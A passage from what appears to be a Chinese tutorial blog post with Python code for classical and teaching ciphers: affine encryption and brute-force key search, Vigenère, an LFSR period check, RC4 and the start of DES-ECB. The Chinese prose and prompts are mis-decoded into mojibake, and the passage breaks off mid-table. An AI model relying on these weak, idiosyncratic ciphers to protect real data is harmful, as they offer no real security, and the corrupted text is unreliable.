= <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;è¯·è¾“å…¥æ‰€éœ€çš„æ“ä½œï¼šç¼–ç /E or è§£ç /D: &#x27;</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&#x27;E&#x27;</span>:            a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥a:&#x27;</span>))            b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥b:&#x27;</span>))            s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥éœ€è¦åŠ å¯†çš„å­—ç¬¦:&#x27;</span>)            encode(a, b, s)        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&#x27;D&#x27;</span>:            a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥a:&#x27;</span>))            b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥b:&#x27;</span>))            s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥éœ€è¦è§£å¯†çš„å­—ç¬¦ï¼š&#x27;</span>)            decode(a, b, s)  <span class="hljs-comment"># åˆ©ç”¨é€†å…ƒè§£å¯†</span>            <span class="hljs-comment"># s_decode(a,b,s)   # æš´åŠ›æšä¸¾æ¯ä¸€ä¸ªå­—ç¬¦</span>        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&#x27;è¾“å…¥é”™è¯¯ï¼&#x27;</span>)    <span class="hljs-keyword">except</span> KeyError:        print(<span class="hljs-string">&#x27;è¯·å‹¿è¾“å…¥ç©ºæ ¼ï¼&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()<span class="hljs-comment"># a = 7, b = 22</span><span class="hljs-comment"># plain = firstthesentenceandthentheevidencesaidthequeen</span><span class="hljs-comment"># crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj</span></code></pre><p>åŠ è§£å¯†ç»“æœå¦‚å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2020/12/23/CqbfOdNB3mxHDt4.png" alt="image-20201223225306141"></p><p><img src="https://i.loli.net/2020/12/23/CZHiL8cDjlUdvSw.png" alt="image-20201223225317161"></p><h3 id="ç ´è§£ä»¿å°„å¯†ç "><a href="#ç ´è§£ä»¿å°„å¯†ç " class="headerlink" title="ç ´è§£ä»¿å°„å¯†ç "></a>ç ´è§£ä»¿å°„å¯†ç </h3><p>è¿™é‡Œä½¿ç”¨äº†åŠ è§£å¯†ä¸­çš„ <code>gcd</code> <code>findModReverse</code>ï¼Œæ‰¾å‡º26ä»¥å†…ä¸”ä¸26äº’ç´ çš„æ‰€æœ‰æ•°çš„é€†å…ƒï¼Œå¹¶å­˜æ”¾åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findAllre</span>():</span>    <span class="hljs-comment"># æ‰¾å‡ºæ‰€æœ‰å°äº26ä¸”ä¸26äº’ç´ çš„æ•°</span>    re_all = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:            res = findModReverse(i,<span class="hljs-number">26</span>)            re_all.append(res)    <span class="hljs-comment">#re_all.sort()</span>    <span class="hljs-keyword">return</span> re_all</code></pre><p>å®Œæ•´ä»£ç å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span>(<span class="hljs-params">a,b</span>):</span>  <span class="hljs-comment"># æ±‚å‡ºæœ€å¤§å…¬å› æ•°</span>    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:        a,b = b%a,a    <span class="hljs-keyword">return</span> b<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span>(<span class="hljs-params">a,m</span>):</span> <span class="hljs-comment">#æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€†</span>    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:        q = u3//v3        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3    <span class="hljs-keyword">return</span> u1%m<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findAllre</span>():</span>    <span class="hljs-comment"># æ‰¾å‡ºæ‰€æœ‰å°äº26ä¸”ä¸26äº’ç´ çš„æ•°</span>    re_all = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:            res = findModReverse(i,<span class="hljs-number">26</span>)            re_all.append(res)    <span class="hljs-comment">#re_all.sort()</span>    <span class="hljs-keyword">return</span> re_all<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">s</span>):</span>    re_all = findAllre()    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> re_all:        <span class="hljs-keyword">for</span> k2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):            result = <span class="hljs-string">&quot;&quot;</span>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):                s2 = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">int</span>(k1) * (<span class="hljs-built_in">ord</span>(s[i]) - <span class="hljs-number">97</span> - k2)) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>))                result = result + s2            print(<span class="hljs-string">&quot;k1=&quot;</span> + <span class="hljs-built_in">str</span>(findModReverse(k1,<span class="hljs-number">26</span>)) + <span class="hljs-string">&quot;, k2=&quot;</span> + <span class="hljs-built_in">str</span>(k2) + <span class="hljs-string">&quot; plaintext = &quot;</span> + result)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>   <span class="hljs-comment"># criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27;</span>    criphertext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦ç ´è§£çš„å¯†æ–‡: &quot;</span>)    criphertext = criphertext.lower()    print(<span class="hljs-string">&quot;---------&quot;</span>*<span class="hljs-number">3</span>+<span class="hljs-string">&quot;strat attck&quot;</span>+<span class="hljs-string">&quot;---------&quot;</span>*<span class="hljs-number">3</span>)    decode(criphertext)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:     main()</code></pre><p>æ•ˆæœå¦‚ä¸‹</p><img src="https://i.loli.net/2020/12/23/lrQLWVebkuphvTK.png" alt="image-20201223170037595" style="zoom:67%;"><h2 id="ç»´å‰å°¼äºšå¯†ç "><a href="#ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="ç»´å‰å°¼äºšå¯†ç "></a>ç»´å‰å°¼äºšå¯†ç </h2><h3 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h3><p><strong>ç»´å‰å°¼äºšå¯†ç </strong>ï¼ˆåˆè¯‘<strong>ç»´çƒ­çº³å°”å¯†ç </strong>ï¼‰æ˜¯ä½¿ç”¨ä¸€ç³»åˆ—<a href="https://baike.baidu.com/item/å‡¯æ’’å¯†ç ">å‡¯æ’’å¯†ç </a>ç»„æˆå¯†ç å­—æ¯è¡¨çš„åŠ å¯†ç®—æ³•ï¼Œå±äºå¤šè¡¨å¯†ç çš„ä¸€ç§ç®€å•å½¢å¼ã€‚</p><p>ç»´å‰å°¼äºšå¯†ç æ›¾å¤šæ¬¡è¢«å‘æ˜ã€‚è¯¥æ–¹æ³•æœ€æ—©è®°å½•åœ¨<a href="https://baike.baidu.com/item/å‰å¥¥ä¸‡Â·å·´è’‚æ–¯å¡”Â·è´æ‹‰ç´¢">å‰å¥¥ä¸‡Â·å·´è’‚æ–¯å¡”Â·è´æ‹‰ç´¢</a>ï¼ˆ Giovan Battista Bellasoï¼‰äº1553å¹´æ‰€è‘—çš„ä¹¦ã€Šå‰å¥¥ä¸‡Â·å·´è’‚æ–¯å¡”Â·è´æ‹‰ç´¢å…ˆç”Ÿçš„å¯†ç ã€‹ï¼ˆ<a href="https://baike.baidu.com/item/æ„å¤§åˆ©è¯­">æ„å¤§åˆ©è¯­</a>ï¼šLa cifra del. Sig. Giovan Battista Bellasoï¼‰ä¸­ã€‚ç„¶è€Œï¼Œåæ¥åœ¨19ä¸–çºªæ—¶è¢«è¯¯ä¼ ä¸ºæ˜¯<a href="https://baike.baidu.com/item/æ³•å›½">æ³•å›½</a>å¤–äº¤å®˜<a href="https://baike.baidu.com/item/å¸ƒè±æ–¯Â·å¾·Â·ç»´å‰å°¼äºš">å¸ƒè±æ–¯Â·å¾·Â·ç»´å‰å°¼äºš</a>ï¼ˆBlaise De VigenÃ¨reï¼‰æ‰€åˆ›é€ ï¼Œå› æ­¤ç°åœ¨è¢«ç§°ä¸ºâ€œç»´å‰å°¼äºšå¯†ç â€ã€‚</p><p>ç»´å‰å°¼äºšå¯†ç ä»¥å…¶ç®€å•æ˜“ç”¨è€Œè‘—ç§°ï¼ŒåŒæ—¶åˆå­¦è€…é€šå¸¸éš¾ä»¥ç ´è§£ï¼Œå› è€Œåˆè¢«ç§°ä¸ºâ€œä¸å¯ç ´è¯‘çš„å¯†ç â€ã€‚è¿™ä¹Ÿè®©å¾ˆå¤šäººä½¿ç”¨ç»´å‰å°¼äºšå¯†ç æ¥åŠ å¯†çš„ç›®çš„å°±æ˜¯ä¸ºäº†å°†å…¶ç ´è§£ã€‚</p><h3 id="2-åŠ è§£å¯†åŸç†"><a href="#2-åŠ è§£å¯†åŸç†" class="headerlink" title="2.åŠ è§£å¯†åŸç†"></a>2.åŠ è§£å¯†åŸç†</h3><img src="https://i.loli.net/2020/12/23/DFHntXC9Ysp6dyV.png" alt="image-20201223225441528" style="zoom:67%;"><p>åŠ è§£å¯†ä»£ç </p><pre><code class="hljs python"><span class="hljs-comment"># å°†å¯†é’¥å¤„ç†æˆå’Œå¯†æ–‡/æ˜æ–‡ä¸€æ ·é•¿</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_key</span>(<span class="hljs-params">s,key</span>):</span>    nkey = key    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(nkey) &lt; <span class="hljs-built_in">len</span>(s):        nkey = nkey+key    nkey = nkey[:<span class="hljs-built_in">len</span>(s)]    <span class="hljs-keyword">return</span> nkey<span class="hljs-comment"># åŠ å¯†å‡½æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">s,key</span>):</span>    print(<span class="hljs-string">&#x27;åŠ å¯†åçš„ç»“æœï¼š &#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)    s1 = s.upper()    key1 = solve_key(s, key)    key1 = key1.upper()    result = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):        s2 = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">abs</span>(((<span class="hljs-built_in">ord</span>(s1[i])-<span class="hljs-number">65</span>)+(<span class="hljs-built_in">ord</span>(key1[i])-<span class="hljs-number">65</span>)) % <span class="hljs-number">26</span>) + <span class="hljs-number">65</span>)        result = result + s2    print(result.lower())<span class="hljs-comment"># è§£å¯†å‡½æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">s,key</span>):</span>    print(<span class="hljs-string">&#x27;è§£å¯†åçš„ç»“æœï¼š &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)    s1 = s.upper()    key1 = solve_key(s, key)    key1 = key1.upper()    result = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s)):        s2 = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(s1[i]) - <span class="hljs-number">65</span>) - (<span class="hljs-built_in">ord</span>(key1[i]) - <span class="hljs-number">65</span>)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)        result = result + s2    print(result.lower())<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:        <span class="hljs-comment"># å‡½æ•°å…¥å£</span>        answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;è¯·è¾“å…¥æ‰€éœ€çš„æ“ä½œï¼šç¼–ç /E or è§£ç /D:  &#x27;</span>)        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&#x27;E&#x27;</span>:                key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥å¯†é’¥: &#x27;</span>)                key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, key))                s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥æ˜æ–‡: &#x27;</span>)                s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, s))  <span class="hljs-comment"># å°†å­—ç¬¦ä¸²ä¸­çš„éå­—æ¯å­—ç¬¦å»æ‰</span>                <span class="hljs-comment"># print(s)</span>                encode(s, key)            <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&#x27;D&#x27;</span>:                key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥å¯†é’¥: &#x27;</span>)                key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, key))                s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥å¯†æ–‡: &#x27;</span>)                s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, s))                decode(s, key)            <span class="hljs-keyword">else</span>:                print(<span class="hljs-string">&#x27;è¾“å…¥é”™è¯¯ï¼&#x27;</span>)        <span class="hljs-keyword">except</span> KeyError:            print(<span class="hljs-string">&#x27;è¯·æ£€æŸ¥è¾“å…¥æ˜¯å¦æ­£ç¡®ï¼&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><h1 id="äºŒã€åºåˆ—å¯†ç "><a href="#äºŒã€åºåˆ—å¯†ç " class="headerlink" title="äºŒã€åºåˆ—å¯†ç "></a>äºŒã€åºåˆ—å¯†ç </h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>ä»£ç å®ç°</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lsrf</span>(<span class="hljs-params">inti, top</span>):</span>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span>    inti2 = <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-built_in">len</span>(inti)    inti2 = <span class="hljs-built_in">list</span>(inti2)    inti1 = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inti)):        <span class="hljs-keyword">if</span> top[i] == <span class="hljs-string">&quot;1&quot;</span>:            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(inti[i])    <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> % <span class="hljs-number">2</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inti)):        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:            inti2[i] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">sum</span>)        <span class="hljs-keyword">else</span>:            inti2[i] = inti[i - <span class="hljs-number">1</span>]    inti1 = inti1.join(inti2)    <span class="hljs-keyword">return</span> inti1<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    inti_str = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆå§‹åŒ–åºåˆ—ï¼š&quot;</span>))    inti_str = inti_str[::-<span class="hljs-number">1</span>]    inti_str_backup = inti_str    top = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æœ¬åŸå¤šé¡¹å¼ï¼š&quot;</span>))    top = top[::-<span class="hljs-number">1</span>]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) + <span class="hljs-number">1</span>):        <span class="hljs-keyword">if</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i == <span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) - <span class="hljs-number">1</span>:            print(<span class="hljs-string">&quot;ç¬¬&#123;0&#125;æ¬¡&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)            print(<span class="hljs-string">&quot;æ˜¯æœ¬åŸå¤šé¡¹å¼ä¸”å‘¨æœŸæ˜¯&quot;</span> + <span class="hljs-built_in">str</span>(i))            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">elif</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i != <span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) - <span class="hljs-number">1</span>:            print(<span class="hljs-string">&quot;ç¬¬&#123;0&#125;æ¬¡&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)            print(<span class="hljs-string">&quot;ä¸æ˜¯æœ¬åŸå¤šé¡¹å¼ä¸”å‘¨æœŸæ˜¯&quot;</span> + <span class="hljs-built_in">str</span>(i))            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;ç¬¬&#123;0&#125;æ¬¡&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)        inti_str_backup = lsrf(inti_str_backup, top)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>é€‰æ‹©æœ¬åŸå¤šé¡¹å¼å’Œåˆå§‹åºåˆ—å¦‚ä¸‹</p><pre><code class="hljs plain">100000000001000000011100010100100101</code></pre><p>ç¨‹åºè¿è¡Œç»“æœ</p><p><img src="https://i.loli.net/2020/12/23/gfbRGZ57piKChWS.png" alt="image-20201223222649800"></p><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>å®Œæ•´ä»£ç </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> base64<span class="hljs-comment"># Sç›’åˆå§‹åŒ–ç½®æ¢,Keyä¸ºå¯†é’¥</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Rc4_init</span>(<span class="hljs-params">S, Key</span>):</span>    j = <span class="hljs-number">0</span>    Key = Key.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)    Key = hashlib.md5(Key).hexdigest()  <span class="hljs-comment"># é•¿åº¦ä¸º32çš„å­—ç¬¦ä¸²</span>    tmp = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        S.append(i)        tmp.append(Key[i % <span class="hljs-built_in">len</span>(Key)])    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        j = (j + S[i] + <span class="hljs-built_in">ord</span>(tmp[i])) % <span class="hljs-number">256</span>        S[i], S[j] = S[j], S[i]             <span class="hljs-comment"># äº¤æ¢S[i],S[j]</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Encode</span>(<span class="hljs-params">S, plaintext</span>):</span>    i = j = <span class="hljs-number">0</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> plaintext:        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        j = (j + S[i]) % <span class="hljs-number">256</span>        S[i], S[j] = S[j], S[i]        t = (S[i] + S[j]) % <span class="hljs-number">256</span>        k = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ S[t])        result += k    result = base64.b64encode(result.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))    result = result.decode()    <span class="hljs-keyword">return</span> result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Decode</span>(<span class="hljs-params">S, criphtext</span>):</span>    i = j = <span class="hljs-number">0</span>    criphtext = base64.b64decode(criphtext)    criphtext = <span class="hljs-built_in">str</span>(criphtext.decode())    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> criphtext:        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        j = (j + S[i]) % <span class="hljs-number">256</span>        S[i], S[j] = S[j], S[i]        t = (S[i] + S[j]) % <span class="hljs-number">256</span>        k = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ S[t])        result += k    <span class="hljs-keyword">return</span> result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:        order = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æŒ‡ä»¤,åŠ å¯†/E,è§£å¯†/D :&quot;</span>)        <span class="hljs-keyword">if</span> order.upper() ==<span class="hljs-string">&#x27;E&#x27;</span>:            plaintext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥æ˜æ–‡: &#x27;</span>)            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†é’¥: &quot;</span>)            s = []            Rc4_init(s, key)            cryphtext = rc4_Encode(s, plaintext)            print(<span class="hljs-string">&quot;å¯†æ–‡ä¸º: &quot;</span>, cryphtext)            print(<span class="hljs-string">&#x27;\n&#x27;</span>)        <span class="hljs-keyword">else</span>:            cryphtext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†æ–‡: &quot;</span>)            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†é’¥: &quot;</span>)            s = []            Rc4_init(s, key)            plaintext = rc4_Decode(s, cryphtext)            print(<span class="hljs-string">&quot;æ˜æ–‡ä¸º: &quot;</span>, plaintext)            print(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><h1 id="ä¸‰ã€DES"><a href="#ä¸‰ã€DES" class="headerlink" title="ä¸‰ã€DES"></a>ä¸‰ã€DES</h1><p>DEC_ECBæ¨¡å¼</p><pre><code class="hljs python"><span class="hljs-comment"># ä¸¤å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span>(<span class="hljs-params">str1, str2</span>):</span>    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(str1)):        xor_res = <span class="hljs-built_in">int</span>(str1[i], <span class="hljs-number">10</span>)^<span class="hljs-built_in">int</span>(str2[i], <span class="hljs-number">10</span>)        <span class="hljs-keyword">if</span> xor_res == <span class="hljs-number">1</span>:            res += <span class="hljs-string">&#x27;1&#x27;</span>        <span class="hljs-keyword">else</span>:            res += <span class="hljs-string">&#x27;0&#x27;</span>    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å¤„ç†å­—ç¬¦ä¸²ï¼Œå°†æ¯ä¸ªå­—ç¬¦ä¸²éƒ½è½¬æˆå…«ä½äºŒè¿›åˆ¶æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_process</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:        tmp = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]        tmp = (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(tmp)) * <span class="hljs-string">&#x27;0&#x27;</span> + tmp  <span class="hljs-comment"># ä¸å¤Ÿå…«ä½åˆ™åœ¨å‰é¢è¡¥ 0</span>        res += tmp    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># PC-1ç›’å¤„ç†</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_change_1</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    change_table = [<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,                 <span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,                 <span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,                 <span class="hljs-number">3</span>,<span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,                 <span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,                 <span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,                 <span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>]    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># PC-2ç›’å¤„ç†</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_change_2</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    change_table = [<span class="hljs-number">14</span>,<span class="hljs-number">17</span>,<span class="hljs-number">11</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">28</span>,                 <span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">21</span>,<span class="hljs-number">10</span>,<span class="hljs-number">23</span>,<span class="hljs-number">19</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,                 <span class="hljs-number">26</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">27</span>,<span class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,                 <span class="hljs-number">41</span>,<span class="hljs-number">52</span>,<span class="hljs-number">31</span>,<span class="hljs-number">37</span>,<span class="hljs-number">47</span>,<span class="hljs-number">55</span>,<span class="hljs-number">30</span>,<span 